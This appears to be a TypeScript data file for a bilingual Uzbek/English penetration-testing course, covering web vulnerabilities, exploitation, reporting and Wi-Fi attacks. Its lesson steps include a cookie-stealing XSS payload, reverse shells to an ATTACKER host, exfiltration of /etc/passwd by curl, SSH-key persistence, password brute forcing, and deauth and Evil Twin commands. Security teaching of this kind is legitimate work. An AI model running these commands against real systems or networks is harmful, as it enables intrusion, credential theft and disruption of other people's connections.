          en: ["3 XSS types", "Cookie stealing payload", "CSP defense"],
        },
        steps: [
          { command: "<script>alert(document.domain)</script>" },
          { command: "<img src=x onerror='fetch(`//evil/?c=`+document.cookie)'>" },
          { command: "<svg/onload=alert(1)>" },
        ],
      },
      {
        id: "idor-csrf-ssrf",
        difficulty: "intermediate",
        duration: 25,
        title: k("IDOR, CSRF, SSRF", "IDOR, CSRF, SSRF"),
        intro: k(
          "Top zaifliklar: ID o'zgartirish, soxta so'rov, server tomon SSRF.",
          "Top vulns: changing IDs, forged requests, server-side SSRF.",
        ),
        objectives: {
          uz: ["IDOR aniqlash", "CSRF token tushuntirish", "SSRF cloud metadata"],
          en: ["Identify IDOR", "Explain CSRF tokens", "SSRF cloud metadata"],
        },
        steps: [
          { command: "curl http://target.lab/api/user/123 -H 'Cookie: sid=...'" },
          { command: "curl 'http://target.lab/fetch?url=http://169.254.169.254/latest/meta-data/'" },
        ],
      },
      {
        id: "web-tools",
        difficulty: "intermediate",
        duration: 20,
        title: k("ZAP, WFuzz, Dirbuster", "ZAP, WFuzz, Dirbuster"),
        intro: k(
          "Zaiflikni avtomatik aniqlash va yashirin yo'llarni topish.",
          "Auto-discover vulns and find hidden paths.",
        ),
        objectives: {
          uz: ["ZAP active scan", "WFuzz parametr fuzzing", "Dirbuster wordlist"],
          en: ["ZAP active scan", "WFuzz parameter fuzzing", "Dirbuster wordlist"],
        },
        steps: [
          { command: "zap-cli quick-scan --self-contained http://target.lab" },
          { command: "wfuzz -c -z file,wordlist.txt http://target.lab/FUZZ" },
          { command: "gobuster dir -u http://target.lab -w /usr/share/wordlists/dirb/common.txt" },
        ],
      },
    ],
  },

  // ============ MODULE 8 ============
  {
    id: "exploitation",
    number: 8,
    icon: "bomb",
    accent: "danger",
    title: k("Exploitation va Post-Exploitation", "Exploitation & Post-Exploitation"),
    description: k(
      "Reverse shell, privesc, credential harvesting — to'liq attack chain.",
      "Reverse shell, privesc, credential harvesting — the full attack chain.",
    ),
    lessons: [
      {
        id: "reverse-shell",
        difficulty: "advanced",
        duration: 25,
        title: k("Reverse shell", "Reverse shell"),
        intro: k(
          "Maqsaddan bizga ulanuvchi shell — firewall'ni aylanib o'tish texnikasi.",
          "Shell that connects from target back to us — bypassing firewalls.",
        ),
        objectives: {
          uz: ["Bash, python, nc payload'lar", "msfvenom bilan generatsiya"],
          en: ["Bash, python, nc payloads", "Generate with msfvenom"],
        },
        steps: [
          { command: "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" },
          { command: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"ATTACKER\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'" },
          { command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf" },
        ],
      },
      {
        id: "linux-privesc",
        difficulty: "advanced",
        duration: 30,
        title: k("Linux Privilege Escalation", "Linux Privilege Escalation"),
        intro: k(
          "user → root: SUID, sudo misconfig, kernel exploit, cron.",
          "user → root: SUID, sudo misconfig, kernel exploit, cron.",
        ),
        objectives: {
          uz: ["LinPEAS", "GTFOBins", "sudo -l tahlil"],
          en: ["LinPEAS", "GTFOBins", "sudo -l analysis"],
        },
        steps: [
          { command: "./linpeas.sh | tee out.txt" },
          { command: "sudo -l" },
          { command: "find / -perm -u=s -type f 2>/dev/null" },
          { command: "# https://gtfobins.github.io/ — har bir SUID binary uchun" },
        ],
      },
      {
        id: "password-cracking",
        difficulty: "advanced",
        duration: 25,
        title: k("Password cracking", "Password cracking"),
        intro: k(
          "Hash'ni ochish: John the Ripper, Hashcat, hydra.",
          "Crack hashes: John the Ripper, Hashcat, hydra.",
        ),
        objectives: {
          uz: ["Hash turini aniqlash", "Wordlist hujumi", "Brute force"],
          en: ["Identify hash type", "Wordlist attack", "Brute force"],
        },
        steps: [
          { command: "hashid '5f4dcc3b5aa765d61d8327deb882cf99'" },
          { command: "john --wordlist=rockyou.txt hashes.txt" },
          { command: "hashcat -m 1000 -a 0 ntlm.txt rockyou.txt" },
          { command: "hydra -l admin -P rockyou.txt ssh://10.10.10.5" },
        ],
      },
      {
        id: "post-exploit",
        difficulty: "advanced",
        duration: 25,
        title: k("Post-exploitation", "Post-exploitation"),
        intro: k(
          "Persistence, lateral movement, data exfiltration.",
          "Persistence, lateral movement, data exfiltration.",
        ),
        objectives: {
          uz: ["SSH key qoldirish", "Pivoting", "Stealth"],
          en: ["Drop SSH key", "Pivoting", "Stealth"],
        },
        steps: [
          { command: "echo 'ssh-ed25519 AAAA...' >> ~/.ssh/authorized_keys" },
          { command: "ssh -L 8080:internal:80 user@pivot" },
          { command: "tar czf - /etc/passwd | base64 | curl -X POST --data-binary @- http://exfil/log" },
        ],
      },
    ],
  },

  // ============ MODULE 9 ============
  {
    id: "reporting",
    number: 9,
    icon: "scroll",
    accent: "warning",
    title: k("Pentest Hisoboti", "Pentest Reporting"),
    description: k(
      "Hisobot yozish, CVSS xavf baholash va capstone loyiha.",
      "Writing reports, CVSS scoring and the capstone project.",
    ),
    lessons: [
      {
        id: "report-structure",
        difficulty: "intermediate",
        duration: 25,
        title: k("Hisobot tuzilishi", "Report structure"),
        intro: k(
          "Pentest natijasi — hisobotda. Mijoz uni o'qib tushunishi kerak.",
          "The pentest result lives in the report. The client must understand it.",
        ),
        objectives: {
          uz: [
            "Executive summary",
            "Methodology",
            "Findings + risk rating",
            "Recommendations",
          ],
          en: [
            "Executive summary",
            "Methodology",
            "Findings + risk rating",
            "Recommendations",
          ],
        },
        sections: [
          {
            heading: k("Bo'limlar", "Sections"),
            body: k(
              "1. Executive Summary (1 bet, biznes tilida)\n2. Scope va Methodology (qanday testlandi)\n3. Findings — har biri: nomi, severity, CVSS, takrorlash qadamlari, screenshot, fix\n4. Recommendations — qisqa va aniq\n5. Appendices — log, payload, raw data",
              "1. Executive Summary (1 page, business language)\n2. Scope and Methodology (how it was tested)\n3. Findings — each: name, severity, CVSS, repro steps, screenshot, fix\n4. Recommendations — short and concrete\n5. Appendices — logs, payloads, raw data",
            ),
          },
        ],
        steps: [
          { command: "# Markdown shablonidan boshlang: github.com/juliocesarfort/public-pentesting-reports" },
        ],
      },
      {
        id: "cvss",
        difficulty: "intermediate",
        duration: 20,
        title: k("CVSS xavf baholash", "CVSS risk scoring"),
        intro: k(
          "0.0–10.0 ball — global standart. Mijoz prioritetni shu asosida belgilaydi.",
          "0.0–10.0 score — the global standard. Clients prioritize fixes by it.",
        ),
        objectives: {
          uz: ["CVSS 3.1 vektori", "Base/Temporal/Environmental"],
          en: ["CVSS 3.1 vector", "Base/Temporal/Environmental"],
        },
        steps: [
          { command: "# https://www.first.org/cvss/calculator/3.1" },
          { command: "# Misol: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical" },
        ],
      },
      {
        id: "capstone",
        difficulty: "advanced",
        duration: 120,
        title: k("Capstone: To'liq pentest", "Capstone: Full pentest"),
        intro: k(
          "Hammasini bir joyga jamlang: recon → exploitation → post-exploit → hisobot.",
          "Bring it all together: recon → exploitation → post-exploit → report.",
        ),
        objectives: {
          uz: [
            "Recon: nmap + gobuster",
            "Exploit: web yoki service",
            "Privesc: user → root",
            "Hisobot: 5 sahifa min.",
          ],
          en: [
            "Recon: nmap + gobuster",
            "Exploit: web or service",
            "Privesc: user → root",
            "Report: 5 pages min.",
          ],
        },
        steps: [
          { command: "nmap -sC -sV -oA recon 10.10.10.5" },
          { command: "gobuster dir -u http://10.10.10.5 -w common.txt -o gobuster.txt" },
          { command: "# Tanlangan exploit chain → meterpreter → linpeas → root" },
        ],
      },
    ],
  },

  // ============ MODULE 10: Wi-Fi Pentesting ============
  {
    id: "wifi-pentesting",
    number: 10,
    icon: "network",
    accent: "info",
    title: k("Wi-Fi Pentesting (WPA/WPA2)", "Wi-Fi Pentesting (WPA/WPA2)"),
    description: k(
      "O'z routeringizda WPA/WPA2 shifrini sinash: monitor rejim, handshake, PMKID, WPS, Evil Twin va himoya tavsiyalari.",
      "Test WPA/WPA2 on your own router: monitor mode, handshake, PMKID, WPS, Evil Twin, and defensive recommendations.",
    ),
    lessons: [
      {
        id: "wifi-lab-setup",
        difficulty: "intermediate",
        duration: 20,
        title: k("Ish muhitini tayyorlash", "Preparing the lab"),
        intro: k(
          "Ushbu modulda siz o'z tarmog'ingiz xavfsizligini tekshirish uchun professional vositalardan qonuniy foydalanishni o'rganasiz. Barcha mashqlar faqat ruxsat etilgan muhitda bajarilishi shart. Ikkita Wi-Fi adapterdan foydalanamiz: ichki (MediaTek) internet uchun, tashqi (TP-Link Archer T4U) monitor rejim uchun.",
          "Learn to legally use professional tools to test your own network's security. All exercises must be performed only in authorized environments. We use two adapters: internal (MediaTek) for internet, external (TP-Link Archer T4U) for monitor mode.",
        ),
        objectives: {
          uz: [
            "Adapterlarni airmon-ng yordamida aniqlash",
            "Internetni saqlab, faqat tashqi adapterni monitor rejimga o'tkazish",
            "iwconfig orqali rejimni tasdiqlash",
          ],
          en: [
            "Identify adapters with airmon-ng",
            "Switch only the external adapter to monitor mode while keeping internet",
            "Verify mode via iwconfig",
          ],
        },
        sections: [
          {
            heading: k("Adapterlarni aniqlash", "Identify adapters"),
            body: k(
              "airmon-ng buyrug'i barcha simsiz interfeyslarni ko'rsatadi. Misol: wlan1 — ichki MediaTek (internet), wlan0 — TP-Link (hujum uchun).",
              "airmon-ng lists all wireless interfaces. Example: wlan1 — internal MediaTek (internet), wlan0 — TP-Link (for testing).",
            ),
          },
          {
            heading: k("Monitor rejimga o'tish", "Enabling monitor mode"),
            body: k(
              "airmon-ng check kill butun internetni uzadi. O'rniga faqat kerakli interfeysni monitor rejimga oling: sudo airmon-ng start wlan0. Endi wlan0mon monitor, wlan1 esa internetga ulangan holda qoladi.",
              "airmon-ng check kill drops all internet. Instead, switch only the chosen interface: sudo airmon-ng start wlan0. wlan0mon is now in monitor mode, wlan1 stays online.",
            ),
          },
        ],
        steps: [
          { command: "sudo airmon-ng", hint: k("Adapterlar ro'yxati", "List adapters") },
          { command: "sudo airmon-ng start wlan0", hint: k("TP-Linkni monitor rejimga", "TP-Link → monitor") },
          { command: "iwconfig", hint: k("wlan0mon Mode:Monitor bo'lishi kerak", "wlan0mon should show Mode:Monitor") },
        ],
      },
      {
        id: "wifi-recon",
        difficulty: "intermediate",
        duration: 15,
        title: k("Atrofdagi tarmoqlarni razvedka qilish", "Scanning nearby networks"),
        intro: k(
          "airodump-ng yordamida atrofdagi barcha simsiz tarmoqlarni ko'rib chiqamiz va o'z tarmog'imizning BSSID, kanal va shifrlash turini yozib olamiz.",
          "Use airodump-ng to enumerate nearby wireless networks and record BSSID, channel, and encryption of your own network.",
        ),
        objectives: {
          uz: ["BSSID va kanalni aniqlash", "Shifrlash turini o'qish", "Faol mijozlarni ko'rish"],
          en: ["Identify BSSID and channel", "Read encryption type", "Spot active clients"],
        },
        sections: [
          {
            heading: k("Razvedka", "Recon"),
            body: k(
              "Misol natija: BSSID = 7C:8B:CA:B8:B3:B4, CH = 5, ESSID = Alsamos, ENC = WPA2. Ushbu qiymatlarni keyingi bosqichlarda qo'llaymiz.",
              "Example output: BSSID = 7C:8B:CA:B8:B3:B4, CH = 5, ESSID = Alsamos, ENC = WPA2. Use these values in next steps.",
            ),
          },
        ],
        steps: [
          { command: "sudo airodump-ng wlan0mon" },
        ],
      },
      {
        id: "wifi-handshake",
        difficulty: "advanced",
        duration: 25,
        title: k("Klassik Handshake hujumi", "Classic Handshake attack"),
        intro: k(
          "Agar tarmoqda faol mijoz bo'lsa, uni qisqa muddatga uzib, qayta ulanish vaqtida WPA handshake'ni ushlaymiz va lug'at hujumi bilan parolni topishga harakat qilamiz.",
          "If an active client is present, briefly disconnect it and capture the WPA handshake during reconnection, then attempt a dictionary attack.",
        ),
        objectives: {
          uz: ["Maqsadli yozuvni boshlash", "Deauth hujumi", "Lug'at hujumi"],
          en: ["Start targeted capture", "Run deauth", "Dictionary attack"],
        },
        sections: [
          {
            heading: k("1. Yozuvni boshlash", "1. Start capture"),
            body: k(
              "Maqsadli kanal va BSSID bo'yicha airodump-ng ni ishga tushiring va capture_handshake fayliga yozing.",
              "Run airodump-ng on target channel and BSSID, writing to capture_handshake.",
            ),
          },
          {
            heading: k("2. Deauthentication", "2. Deauthentication"),
            body: k(
              "Yangi terminalda mijozni qisqa muddatga uzing. Birinchi terminalda 'WPA handshake: ...' yozuvi paydo bo'lsa, Ctrl+C bilan to'xtating.",
              "In a new terminal, briefly deauth the client. When 'WPA handshake: ...' appears in the first terminal, stop with Ctrl+C.",
            ),
          },
          {
            heading: k("3. Parolni qidirish", "3. Crack the password"),
            body: k(
              "rockyou.txt lug'ati bilan aircrack-ng ishga tushiring. Parol lug'atda bo'lsa, KEY FOUND! ekrani chiqadi.",
              "Run aircrack-ng with rockyou.txt. If the password is in the wordlist, KEY FOUND! is shown.",
            ),
          },
        ],
        steps: [
          { command: "sudo airodump-ng -c 5 --bssid 7C:8B:CA:B8:B3:B4 -w capture_handshake wlan0mon" },
          { command: "sudo aireplay-ng -0 5 -a 7C:8B:CA:B8:B3:B4 -c A4:6B:40:79:76:AE wlan0mon", hint: k("Maqsadli mijoz", "Targeted client") },
          { command: "sudo aireplay-ng -0 5 -a 7C:8B:CA:B8:B3:B4 wlan0mon", hint: k("Broadcast deauth", "Broadcast deauth") },
          { command: "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture_handshake-01.cap" },
        ],
      },
      {
        id: "wifi-pmkid",
        difficulty: "advanced",
        duration: 25,
        title: k("PMKID hujumi (mijozsiz)", "PMKID attack (clientless)"),
        intro: k(
          "Ba'zi routerlar PMKID yuboradi va bu hech qanday mijoz ulanishisiz parolga hujum qilish imkonini beradi. Bu usul har bir routerda ishlamaydi — bu routerga bog'liq.",
          "Some routers send a PMKID, allowing offline password attacks without any client. Not all routers are vulnerable.",
        ),
        objectives: {
          uz: ["airodump-ng bilan PMKID yozish", "hcxdumptool muqobil yo'l", "hashcat orqali brute-force"],
          en: ["Capture PMKID with airodump-ng", "Alternative via hcxdumptool", "Brute-force via hashcat"],
        },
        sections: [
          {
            heading: k("airodump-ng yo'li", "airodump-ng path"),
            body: k(
              "airodump-ng 1.7+ versiyalari PMKID ni avtomatik ushlaydi. 2-3 daqiqa kuting va aircrack-ng bilan parolni qidiring.",
              "airodump-ng 1.7+ captures PMKID automatically. Wait 2-3 minutes, then crack with aircrack-ng.",
            ),
          },
          {
            heading: k("hcxdumptool yo'li", "hcxdumptool path"),
            body: k(
              "Aniqroq usul — hcxdumptool bilan yozib olish, hcxpcapngtool bilan hash.22000 ga o'tkazish va hashcat (rejim 22000) bilan brute-force.",
              "More precise: capture with hcxdumptool, convert via hcxpcapngtool to hash.22000, then brute-force with hashcat (mode 22000).",
            ),
          },
        ],
        steps: [
          { command: "sudo airodump-ng -c 5 --bssid 7C:8B:CA:B8:B3:B4 -w capture_pmkid wlan0mon" },
          { command: "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture_pmkid-01.cap" },
          { command: "echo \"7C:8B:CA:B8:B3:B4\" > target.txt" },
          { command: "sudo hcxdumptool -i wlan0mon -w pmkid.pcapng --filterlist_ap=target.txt --filtermode=2" },
          { command: "hcxpcapngtool -o hash.22000 pmkid.pcapng" },
          { command: "hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt" },
        ],
      },
      {
        id: "wifi-wps",
        difficulty: "intermediate",
        duration: 20,
        title: k("WPS PIN hujumi", "WPS PIN attack"),
        intro: k(
          "Routerda WPS yoqilgan bo'lsa, PIN kodni topib, parolni darhol olish mumkin. Zamonaviy routerlarning ko'pchiligida WPS o'chirilgan yoki himoyalangan.",
          "If WPS is enabled, you can recover the PIN and then the password. Most modern routers disable or harden WPS.",
        ),
        objectives: {
          uz: ["WPS holatini wash bilan tekshirish", "reaver yoki bully bilan PIN topish"],
          en: ["Check WPS state with wash", "Recover PIN with reaver or bully"],
        },
        sections: [
          {
            heading: k("Holatni tekshirish", "Check state"),
            body: k(
              "wash WPS Locked: No bo'lsa, hujumga o'tish mumkin. Aks holda — to'xtang.",
              "If wash shows WPS Locked: No, you can proceed. Otherwise, stop.",
            ),
          },
          {
            heading: k("PIN brute-force", "PIN brute-force"),
            body: k(
              "reaver bir necha soatda PIN topadi. Tiqilib qolsa, bully ni sinab ko'ring. 'AP seems to have WPS turned off' xabari ushbu hujum imkonsiz ekanligini bildiradi.",
              "reaver can find the PIN in hours. If stuck, try bully. 'AP seems to have WPS turned off' means this attack is not possible.",
            ),
          },
        ],
        steps: [
          { command: "sudo wash -i wlan0mon" },
          { command: "sudo reaver -i wlan0mon -b 7C:8B:CA:B8:B3:B4 -c 5 -vv" },
          { command: "sudo bully wlan0mon -b 7C:8B:CA:B8:B3:B4 -c 5 -vv" },
        ],
      },
      {
        id: "wifi-evil-twin",
        difficulty: "advanced",
        duration: 30,
        title: k("Evil Twin (Soxta AP) hujumi", "Evil Twin (Rogue AP) attack"),
        intro: k(
          "Mijozlarni aldab, parollarini qo'lga kiritishning eng kuchli usuli — asl tarmoq nomi bilan soxta Access Point yaratish. Bu mashq faqat o'z mijozlaringiz va o'z tarmog'ingiz uchun bajariladi.",
          "The strongest social-engineering vector — clone the SSID with a rogue AP. This exercise must only be performed against your own network and clients.",
        ),
        objectives: {
          uz: ["Adapterlarni qayta taqsimlash", "hostapd-wpe bilan soxta AP", "Asl mijozlarni deauth qilib soxta tarmoqqa olib o'tish"],
          en: ["Reassign adapters", "Rogue AP with hostapd-wpe", "Deauth real clients to push them to rogue AP"],
        },
        sections: [
          {
            heading: k("hostapd-wpe konfiguratsiyasi", "hostapd-wpe config"),
            body: k(
              "interface=wlan1, ssid=Alsamos, channel=5, wpa=2, wpa_passphrase=12345678. Konfig faylni /etc/hostapd-wpe/hostapd-wpe.conf ga yozing.",
              "interface=wlan1, ssid=Alsamos, channel=5, wpa=2, wpa_passphrase=12345678. Save to /etc/hostapd-wpe/hostapd-wpe.conf.",
            ),
          },
          {
            heading: k("Hujumni boshlash", "Launch the attack"),
            body: k(
              "hostapd-wpe ishga tushgach, yangi terminalda asl AP ga deauth yuboring. Mijozlar soxta tarmoqqa ulanishga urinadi va parol terminalda [WPE] Password captured: shaklida ko'rinadi.",
              "After hostapd-wpe starts, deauth the real AP from a new terminal. Clients will try to join the rogue AP and the password appears as [WPE] Password captured:.",
            ),
          },
          {
            heading: k("To'xtatish", "Cleanup"),
            body: k(
              "killall hostapd-wpe, airmon-ng stop wlan0mon, systemctl restart NetworkManager — tarmoq holatini tiklash uchun.",
              "killall hostapd-wpe, airmon-ng stop wlan0mon, systemctl restart NetworkManager — to restore network state.",
            ),
          },
        ],
        steps: [
          { command: "sudo apt install hostapd-wpe -y" },
          { command: "sudo airmon-ng stop wlan0mon" },
          { command: "sudo ip link set wlan1 down && sudo iw dev wlan1 set type managed && sudo ip link set wlan1 up" },
          { command: "sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf" },
          { command: "sudo airmon-ng start wlan0" },
          { command: "sudo aireplay-ng -0 0 -a 7C:8B:CA:B8:B3:B4 wlan0mon" },
          { command: "sudo killall hostapd-wpe" },
          { command: "sudo systemctl restart NetworkManager" },
        ],
      },
      {
        id: "wifi-defense",
        difficulty: "beginner",
        duration: 15,
        title: k("Himoyalanish bo'yicha tavsiyalar", "Defensive recommendations"),
        intro: k(
          "Yuqoridagi hujumlardan himoyalanish uchun routeringizni to'g'ri sozlang va muntazam monitoring olib boring.",
          "Mitigate the above attacks by hardening your router and monitoring continuously.",
        ),
        objectives: {
          uz: ["WPA3 ga o'tish", "WPS ni o'chirish", "PMF (802.11w) yoqish", "Murakkab parol o'rnatish"],
          en: ["Upgrade to WPA3", "Disable WPS", "Enable PMF (802.11w)", "Set a strong passphrase"],
        },
        sections: [
          {
            heading: k("Asosiy choralar", "Core measures"),
            body: k(
              "Proshivkani yangilang, kamida 12 belgili maxsus belgilarli parol qo'ying, WPS ni o'chiring, 802.11w (PMF) ni yoqing — deauth hujumlarini qiyinlashtiradi. airodump-ng yoki Fing bilan tarmog'ingizni muntazam tekshiring.",
              "Update firmware, set a 12+ char passphrase with special chars, disable WPS, enable 802.11w (PMF) to harden against deauth, and monitor your network with airodump-ng or Fing.",
            ),
          },
        ],
        steps: [
          { command: "# Router admin panelida: WPA3-Personal, PMF=Required, WPS=Disabled" },
          { command: "sudo airodump-ng wlan0mon", hint: k("Noma'lum qurilmalarni kuzatish", "Watch for unknown devices") },
        ],
      },
      {
        id: "wifi-troubleshooting",
        difficulty: "intermediate",
        duration: 15,
        title: k("Xatolar va yechimlar", "Errors and fixes"),
        intro: k(
          "Wi-Fi pentestda eng ko'p uchraydigan xatolar va ularning amaliy yechimlari.",
          "Most common Wi-Fi pentest errors and practical fixes.",
        ),
        objectives: {
          uz: ["Interfeys bandligini hal qilish", "DNS nosozliklarini tuzatish", "PMKID/Handshake yo'qligida nima qilish"],
          en: ["Resolve busy interface", "Fix DNS issues", "What to do when no PMKID/Handshake"],
        },
        sections: [
          {
            heading: k("ioctl(SIOCSIWMODE) failed: Device or resource busy", "ioctl(SIOCSIWMODE) failed: Device or resource busy"),
            body: k(
              "Sabab: interfeys band yoki boshqa jarayon halaqit qilmoqda. Yechim: airmon-ng check kill (internet kerak bo'lmasa) yoki kerakli interfeysni to'xtatib qayta yoqing.",
              "Cause: interface busy or other process interfering. Fix: airmon-ng check kill (if internet not needed) or stop/restart only the needed interface.",
            ),
          },
          {
            heading: k("Temporary failure in name resolution", "Temporary failure in name resolution"),
            body: k(
              "DNS yo'qolgan. Yechim: echo \"nameserver 8.8.8.8\" | sudo tee /etc/resolv.conf",
              "DNS lost. Fix: echo \"nameserver 8.8.8.8\" | sudo tee /etc/resolv.conf",
            ),
          },
          {
            heading: k("Packets contained no EAPOL data", "Packets contained no EAPOL data"),
            body: k(
              "Handshake yoki PMKID olinmagan. Mijoz ulanguncha kuting yoki PMKID yuborishini boshqa usulda tekshiring.",
              "No handshake or PMKID captured. Wait for client to connect or check PMKID emission via another tool.",
            ),
          },
          {
            heading: k("AP seems to have WPS turned off", "AP seems to have WPS turned off"),
            body: k(
              "Routerda WPS o'chirilgan. WPS hujumini to'xtating va boshqa usulga (Handshake/PMKID/Evil Twin) o'ting.",
              "WPS disabled on router. Stop WPS attack and switch to another method (Handshake/PMKID/Evil Twin).",
            ),
          },
        ],
        steps: [
          { command: "sudo airmon-ng check kill" },
          { command: "echo \"nameserver 8.8.8.8\" | sudo tee /etc/resolv.conf" },
          { command: "sudo apt install hcxdumptool hcxtools -y" },
        ],
      },
    ],
  },
];

export const findTrack = (id: string) => TRACKS.find((t) => t.id === id);
export const findLesson = (trackId: string, lessonId: string) =>
  findTrack(trackId)?.lessons.find((l) => l.id === lessonId);

export const totalLessons = () =>
  TRACKS.reduce((acc, t) => acc + t.lessons.length, 0);
